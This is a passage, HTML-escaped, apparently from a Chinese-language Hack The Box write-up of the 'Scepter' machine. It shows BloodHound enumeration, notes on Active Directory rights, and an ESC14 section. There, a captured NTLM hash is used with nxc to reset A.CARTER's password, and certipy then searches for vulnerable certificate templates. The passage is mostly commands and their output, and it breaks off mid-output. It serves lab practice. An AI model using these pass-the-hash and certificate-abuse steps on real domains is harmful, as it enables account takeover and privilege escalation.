+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; gpos
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; ous
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; containers
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; trusts
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Starting computer enumeration with &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; workers
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Querying computer: dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Done in 00M 19S
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Compressing output into 20250901151445_bloodhound.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;出站能改密码，但这个用户也不在远程管理组，改之前顺着用户往下看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;此用户能完全掌控员工出入证这个ou，而这个ou里，或者说这个证书允许注册的用户是&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这个用户的出站没有什么意义&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/scepter/image-3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;esc14&#34;&gt;ESC14
+&lt;/h2&gt;&lt;p&gt;改密码后用A.CARTER查询易受攻击的证书&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc smb $ip -u $user -H $hash -M change-password -o USER&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;A.CARTER  NEWPASS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackyMAKER1!&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/home/wackymaker/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&amp;lt;81.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  from pkg_resources import resource_filename
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; / Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC01&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domin:scepter.htb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Null Auth:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;.baker:18b5fb0d99e7a475316213c15b6f22ce 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CHANGE-P... 10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully changed password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; A.CARTER
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ echo user1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;A.CARTER&amp;gt;&amp;gt;start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ echo pass1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wackyMAKER1!&amp;#39;&lt;/span&gt;&amp;gt;&amp;gt;start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ . start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -u $user1 -p $pass1 -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; certificate authority
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; enabled certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; OIDs linked to templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Retrieving CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt; via RRP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Failed to connect to remote registry. Service should be starting now. Trying again...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully retrieved CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Checking web enrollment &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; CA &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt; @ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc01.scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumeration output:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CA Name                             : scepter-DC01-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DNS Name                            : dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Subject                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter-DC01-CA, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Serial Number           : 716BFFE1BE1CD1A24010F3AD0E350340
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity Start          : 2024-10-31 22:24:19+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity End            : 2061-10-31 22:34:19+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Web Enrollment
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTPS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    User Specified SAN                  : Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Request Disposition                 : Issue
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enforce Encryption &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Requests     : Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Owner                             : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Access Rights
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCa                        : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCertificates              : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enroll                          : SCEPTER.HTB&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;uthenticated Users
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Templates                   : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Could not find any certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -u $user1 -p $pass1 -target $FQDN -dc-ip $ip -text -stdout -vulnera^Ce
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy find -vulnerable -u $user -hashes :$hash -dc-ip $ip -stdout
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding certificate authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; certificate authority
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; enabled certificate templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; issuance policies
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; OIDs linked to templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Retrieving CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt; via RRP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Successfully retrieved CA configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Checking web enrollment &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; CA &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scepter-DC01-CA&amp;#39;&lt;/span&gt; @ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dc01.scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Error checking web enrollment: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Errno 111&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Connection refused
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Use -debug to print a stacktrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumeration output:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
